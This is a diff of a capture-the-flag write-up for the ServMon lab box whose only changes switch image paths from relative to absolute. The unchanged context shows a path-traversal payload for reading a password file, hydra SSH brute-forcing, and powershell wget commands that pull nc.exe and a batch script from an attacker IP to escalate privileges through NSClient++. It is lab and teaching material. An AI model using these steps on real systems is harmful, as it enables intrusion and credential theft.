@@ -126,14 +126,14 @@ ________________________________________________
 
 Checking the landing page on port 80 shows a login panel for NVMS-1000, which  is a video management system (VMS) used to monitor and manage CCTV infrastructure such as DVRs, NVRs, and IP cameras from a centralized interface. It's typically deployed by security teams to view live camera feeds, review recordings, and configure surveillance devices across a network.
 
-![](../assets/img/2026-03-13-ServMon/1.png)
+![](/assets/img/2026-03-13-ServMon/1.png)
 
 We're unable to login with the default credentials of `admin:123456` and verbose errors are disabled, meaning we'll have to enumerate other services until further notice.
 
 ### FTP Anon Login
 Nmap's Default scripts show that FTP allows for anonymous logins, so I connect. Inside is a Users directory with two accounts named Nathan and Nadine, each one having a text file that I transfer over.
 
-![](../assets/img/2026-03-13-ServMon/2.png)
+![](/assets/img/2026-03-13-ServMon/2.png)
 
 They contain the following:
 
@@ -172,7 +172,7 @@ Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: close
 ```
 
-![](../assets/img/2026-03-13-ServMon/3.png)
+![](/assets/img/2026-03-13-ServMon/3.png)
 
 ### SSH Credentials
 Awesome, we already know that Nadine placed a passwords.txt file in Nathan's Desktop directory, so let's try to grab that in order to authenticate over SSH.
@@ -181,7 +181,7 @@ Awesome, we already know that Nadine placed a passwords.txt file in Nathan's Des
 /../../../../../../../../../../../../users/nathan/desktop/passwords.txt
 ```
 
-![](../assets/img/2026-03-13-ServMon/4.png)
+![](/assets/img/2026-03-13-ServMon/4.png)
 
 This returns seven passwords which we can use to spray against both Nathan and Nadine's account, hoping to validate any of these; I save them to a file and use hydra to brute-force these over SSH.
 
@@ -191,11 +191,11 @@ $ hydra -l nadine -P passwords.txt ssh://MACHINE_IP
 $ hydra -l nathan -P passwords.txt ssh://MACHINE_IP
 ```
 
-![](../assets/img/2026-03-13-ServMon/5.png)
+![](/assets/img/2026-03-13-ServMon/5.png)
 
 That gets a hit on Nadine's account and allows us to grab a shell on the box, at which point we can grab the user flag and start internal enumeration towards either Nathan or administrator accounts.
 
-![](../assets/img/2026-03-13-ServMon/6.png)
+![](/assets/img/2026-03-13-ServMon/6.png)
 
 ## Privilege Escalation
 Light enumeration on the filesystem shows that we don't have access to many things, including any other user's home directories, web server logs, or interesting folders. Referring back to the notes gathered over FTP, I find that Nadine had already locked down the NSClient++ (running on port 8443) and that navigating to it in our browser before would block any authentication attempts. Perhaps we'll have access to it now and be able to login with the password list.
@@ -203,7 +203,7 @@ Light enumeration on the filesystem shows that we don't have access to many thin
 ### Password in nsclient.ini
 Before going further, since it's a web server with auth checking, there may be hardcoded credentials in a config file placed in its directory. Some quick research shows that it resides at `C:\Program Files\NSClient++` and the `nsclient.ini` file should have configuration settings in it.
 
-![](../assets/img/2026-03-13-ServMon/7.png)
+![](/assets/img/2026-03-13-ServMon/7.png)
 
 ### Accessing NSClient
 This will allow us to authenticate directly on that server as the nsclient user, however another lines shows that only localhost connection are allowed. Since we already have SSH credentials, I terminate my current session and reconnect while providing a the `-L` flag to forward traffic from port 8443 on the remote machine to the corresponding one on my local box.
@@ -214,7 +214,7 @@ $ ssh nadine@MACHINE_IP -L 8443:127.0.0.1:8443
 
 Now we can navigate to port 8443 on localhost in our browser to login with those newfound credentials.
 
-![](../assets/img/2026-03-13-ServMon/8.png)
+![](/assets/img/2026-03-13-ServMon/8.png)
 
 NSClient++ is a monitoring agent for Windows systems that allows external monitoring platforms to collect system metrics and execute checks remotely. It's commonly used with tools like Nagios to monitor services, performance, and system health across enterprise environments.
 
@@ -237,14 +237,14 @@ $ powershell wget http://10.10.14.243/nc.exe -outfile nc.exe
 $ powershell wget http://10.10.14.243/totallysafe.bat -outfile script.bat
 ```
 
-![](../assets/img/2026-03-13-ServMon/9.png)
+![](/assets/img/2026-03-13-ServMon/9.png)
 
 Once everything is prepared, we must associate our uploaded script with a command in the NSClient++ GUI. I go to **Settings -> External Scripts -> Scripts** and click the green _"Add a Simple Script"_ button. We should create an alias and specify the script to point towards our malicious one on the filesystem.
 
-![](../assets/img/2026-03-13-ServMon/10.png)
+![](/assets/img/2026-03-13-ServMon/10.png)
 
 Once that's added, we need to save these changes to the disk by displaying the Changes dropdown tab in the header and hitting Save Configuration. We can execute it one of two ways, either by scheduling it to be ran in an interval and specifying that it's a command, or directly from the Console tab by giving it the alias. I go with the ladder as it's very simple.
 
-![](../assets/img/2026-03-13-ServMon/11.png)
+![](/assets/img/2026-03-13-ServMon/11.png)
 
 There we have it, grabbing the final flag under the Administrator's Desktop folder completes this challenge. This box was pretty straight-forward, so I'm not too sure why it's rated so poorly (maybe the port forwarding portion). Either way I enjoyed it and hope that this was helpful to anyone following along or stuck and happy hacking!
